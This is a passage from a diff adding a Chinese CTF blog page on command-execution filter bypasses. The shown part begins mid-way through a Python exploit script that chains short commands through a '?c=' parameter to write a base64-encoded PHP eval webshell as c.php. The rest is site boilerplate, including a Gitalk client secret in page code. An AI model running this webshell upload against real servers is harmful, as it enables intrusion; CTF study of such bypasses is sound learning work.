+                        target <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> i <span class="token keyword">print</span> <span class="token string">"[+] Sending : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">)</span> 
+                        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">)</span> 
+                        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> <span class="token string">"ls -t>1"</span><span class="token punctuation">)</span> 
+                        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> <span class="token string">"sh 1"</span><span class="token punctuation">)</span> 
+                        exec_cmd<span class="token punctuation">(</span><span class="token string">"echo %s>6"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"&lt;?php eval($_POST[c]);?>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> 
+                        exec_cmd<span class="token punctuation">(</span><span class="token string">"cat 6|base64 -d>c"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> 
+                        exec_cmd<span class="token punctuation">(</span><span class="token string">"cp c c.php"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> 
+                        <span class="token keyword">print</span> <span class="token string">"[%s]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span> 
+                        <span class="token keyword">print</span> <span class="token string">"[+] Upload webshell successful!"</span> 
+                        <span class="token keyword">print</span> <span class="token string">"[+] Webshell is stored at : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"c.php"</span><span class="token punctuation">)</span> 
+                        <span class="token keyword">print</span> <span class="token string">"[+] password : c"</span> 
+                        <span class="token keyword">print</span> <span class="token string">"[%s]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>大佬发出来的已经没有缩进了，脚本本身我还没细看，只是简单的加了几个回车，等有时间仔细学习的时候再修改一下缩进</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://liloong3t.com" class="b-link-green">Liloong3t's Blog</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/" class="b-link-green">初级命令执行绕过总结</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '1a8a4f8abcc406ec4fbe',
+        clientSecret: '135ec1ebd0158365190ca1e28c38ce36e857236b',
+        repo: 'LiGuHeiYi.github.io',
+        owner: 'LiGuHeiYi',
+        admin: ["LiGuHeiYi"],
+        id: '2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="初级命令执行绕过总结">
+                        
+                        <span class="card-title">初级命令执行绕过总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            初级命令执行绕过方式总结
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                    blog
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/" target="_blank">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/02/17/2021-2-17-urllib-ku-shi-yong-bi-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="py2与py3中使用urllib库的不同点">
+                        
+                        <span class="card-title">py2与py3中使用urllib库的不同点</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            这段时间学ssrf，看py脚本经常碰到使用urllib库，而py2和py3的urllib库用法有些不一样，做个记录，以后好查找
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category" target="_blank">
+                                    ctf
+                                </a>
+                            
+                            <a href="/categories/ctf/python/" class="post-category" target="_blank">
+                                    python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/python/" target="_blank">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('500')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Liloong3t's Blog<br />'
+            + '作者: Liloong3t<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，转载请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&copy; 2021 Liloong3t. 
+
+            <br>
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">85.8k</span> 字
+            
+
+            
+            <br>
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LiGuHeiYi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=857340909@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+    <a href="https://zhihu.com/people/mu-ren-qing-32" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=857340909&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        // var t1 = Date.UTC(2020, 10, 01, 00, 00, 00); //北京时间2020-10-1 00:00:00
+        // var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        // var diff = t2 - t1;
+        // var diffYears = Math.floor(diff / years);
+        // var diffDays = Math.floor((diff / days) - diffYears * 365);
+        // var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        // var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        // var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+        //     minutes) / seconds);
+        // document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+        //     " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.2.2/masonry.pkgd.min.js"></script>
+        <script src="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdn.bootcss.com/lightgallery/1.6.12/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+
+        
+
+        <!-- 2021.02.01 -->
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "喔哟，404啦！Σ(っ °Д °;)っ", clearTimeout(st)) : (document.title =
+                    "φ(゜▽゜*)♪咦，又好了！~", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果  add 2019.09.09 -->
+        
+
+        <!-- 背景樱花飘落特效 add 2019.09.10 -->
+        
+
+        <!-- 鼠标点击文字特效  add 2019.09.10-->
+        
+
+        <!-- 背景雪花飘落特效  add 2019.09.10 -->
+        
+
+        <!-- 在线聊天工具   add 2019.09.11 -->
+        
+            <script src="//code.tidio.co/xxxxxxxxxxxxxxxxxxxxxxxxxxx.js"></script>
+            <!--  在线聊天位置自定义   add 2019.09.13  -->
+            <script> 
+                $(document).ready(function () {
+
+                    setInterval(change_Tidio, 50);  
+                    function change_Tidio() { 
+
+                        var tidio=$("#tidio-chat iframe");
+                        if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"80px":"20px";   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px";   
+                            document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        } 
+                        else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px"; 
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+                        else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+
+                        if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                            document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                        }
+                    } 
+                }); 
+            </script>
+        
+
+        <!-- 背景 canvas-nest  add 2019.09.15-->
+        
+
+        <!-- 背景静止彩带   add 2019.09.15-->
+        
+
+        <!-- 背景动态彩带   add 2019.09.15-->
+        
+
+        <!-- 天气接口控件  add 2021.02.01 -->
+        
+            <script type="text/javascript">
+    WIDGET = {FID: '1tFpFZ5Mtj'}
+  </script>
+  <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->
+  
+  <script type="text/javascript">
+    //只在桌面版网页启用特效
+    var windowWidth = $(window).width();
+    if (windowWidth > 768) {
+        document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
+    }
+    </script>
+        
+
+    </body>
+</html>
